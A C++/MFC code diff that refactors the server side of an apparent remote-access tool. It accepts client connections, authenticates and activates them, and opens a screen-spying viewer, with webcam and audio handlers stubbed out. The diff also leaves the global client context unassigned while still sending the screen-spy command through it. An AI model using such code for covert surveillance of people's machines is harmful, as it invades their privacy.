@@ -93,9 +93,9 @@ ClientContext *g_pContext = NULL;
 LRESULT CMonitorDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 {
 	ClientContext *pContext = (ClientContext *)lParam;
-	g_pContext = pContext;
+//	g_pContext = pContext;
 
-	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
+	CScreenSpyDlg *dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
 	// 设置父窗口为卓面
 	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
@@ -107,13 +107,13 @@ LRESULT CMonitorDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 
 void CMonitorDlg::ProcessReceiveComplete(ClientContext *pContext)
 {
-	if (pContext == NULL)
+	if (!pContext)
+	{
 		return;
+	}
 
-	// 如果管理对话框打开，交给相应的对话框处理
-	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
+	CDialog	*pMgrDlg = (CDialog	*)pContext->m_Dialog[1];
 
-	// 交给窗口处理
 	if (pContext->m_Dialog[0] > 0)
 	{
 		switch (pContext->m_Dialog[0])
@@ -122,7 +122,7 @@ void CMonitorDlg::ProcessReceiveComplete(ClientContext *pContext)
 			//((CFileManagerDlg *)dlg)->OnReceiveComplete();
 			break;
 		case SCREENSPY_DLG:
-			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
+			((CScreenSpyDlg *)pMgrDlg)->OnReceiveComplete();
 			break;
 		//case WEBCAM_DLG:
 		//	((CWebCamDlg *)dlg)->OnReceiveComplete();
@@ -145,7 +145,7 @@ void CMonitorDlg::ProcessReceiveComplete(ClientContext *pContext)
 		return;
 	}
 
-	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
+	switch (pContext->m_DeCompressBuf.GetBuffer(0)[0])
 	{
 	case TOKEN_AUTH: // 要求验证
 	//	m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
@@ -170,7 +170,7 @@ void CMonitorDlg::ProcessReceiveComplete(ClientContext *pContext)
 			//	//g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
 			//}
 			//// 激活
-			BYTE	bToken = COMMAND_ACTIVED;
+			BYTE bToken = COMMAND_ACTIVED;
 			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
 		}
 
@@ -205,27 +205,29 @@ void CMonitorDlg::ProcessReceiveComplete(ClientContext *pContext)
 	}	
 }
 
-// 需要显示进度的窗口
 void CMonitorDlg::ProcessReceive(ClientContext *pContext)
 {
-	if (pContext == NULL)
+	if (!pContext)
 		return;
-	// 如果管理对话框打开，交给相应的对话框处理
-	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
 
-	// 交给窗口处理
+	CDialog	*pMgrDlg = (CDialog	*)pContext->m_Dialog[1];
+	if (!pMgrDlg)
+	{
+		return;
+	}
+
 	if (pContext->m_Dialog[0] > 0)
 	{
 		switch (pContext->m_Dialog[0])
 		{
 		case SCREENSPY_DLG:
-			((CScreenSpyDlg *)dlg)->OnReceive();
+			((CScreenSpyDlg *)pMgrDlg)->OnReceive();
 			break;
 		case WEBCAM_DLG:
-			//((CWebCamDlg *)dlg)->OnReceive();
+			//((CWebCamDlg *)pMgrDlg)->OnReceive();
 			break;
 		case AUDIO_DLG:
-			//((CAudioDlg *)dlg)->OnReceive();
+			//((CAudioDlg *)pMgrDlg)->OnReceive();
 			break;
 		default:
 			break;
@@ -236,63 +238,47 @@ void CMonitorDlg::ProcessReceive(ClientContext *pContext)
 
 void CALLBACK CMonitorDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
 {
-	try
-	{
-		CMonitorDlg* pFrame = (CMonitorDlg*) lpParam;
-		CString str;
+	CMonitorDlg* pFrame = (CMonitorDlg*) lpParam;
 
-		switch (nCode)
+	switch (nCode)
+	{
+	case NC_CLIENT_CONNECT:
 		{
-		case NC_CLIENT_CONNECT:
-			{
-				g_pContext = pContext;
-			}
-			break;
-		case NC_CLIENT_DISCONNECT:
-			//PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
-			break;
-		case NC_TRANSMIT:
-			break;
-		case NC_RECEIVE:
-			ProcessReceive(pContext);
-			break;
-		case NC_RECEIVE_COMPLETE:
-			ProcessReceiveComplete(pContext);
-			break;
+			//g_pContext = pContext;
 		}
-	}catch(...){}
+		break;
+	case NC_CLIENT_DISCONNECT:
+		//PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
+		break;
+	case NC_TRANSMIT:
+		break;
+	case NC_RECEIVE:
+		ProcessReceive(pContext);
+		break;
+	case NC_RECEIVE_COMPLETE:
+		ProcessReceiveComplete(pContext);
+		break;
+	}
 }
 
 void CMonitorDlg::Activate(UINT nPort, UINT nMaxConnections)
 {
-	CString		str;
-
 	if (m_iocpServer != NULL)
 	{
 		m_iocpServer->Shutdown();
 		delete m_iocpServer;
-
 	}
+
 	m_iocpServer = new CIOCPServer;
 
-	// 开启IPCP服务器
-	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
+	if (!m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
 	{
-
+		AfxMessageBox("IOCP Server Init Failed!");
 	}
-
-}
-
-void SendSelectCommand(PBYTE pData, UINT nSize)
-{
-	// TODO: Add your command handler code here
-
-
-	m_iocpServer->Send(g_pContext, pData, nSize);
 }
 
 void CMonitorDlg::OnBnClickedBtnmonitor()
 {
-	BYTE	bToken = COMMAND_SCREEN_SPY;
-	SendSelectCommand(&bToken, sizeof(BYTE));
+	BYTE bToken = COMMAND_SCREEN_SPY;
+	m_iocpServer->Send(g_pContext, &bToken, sizeof(BYTE));
 }
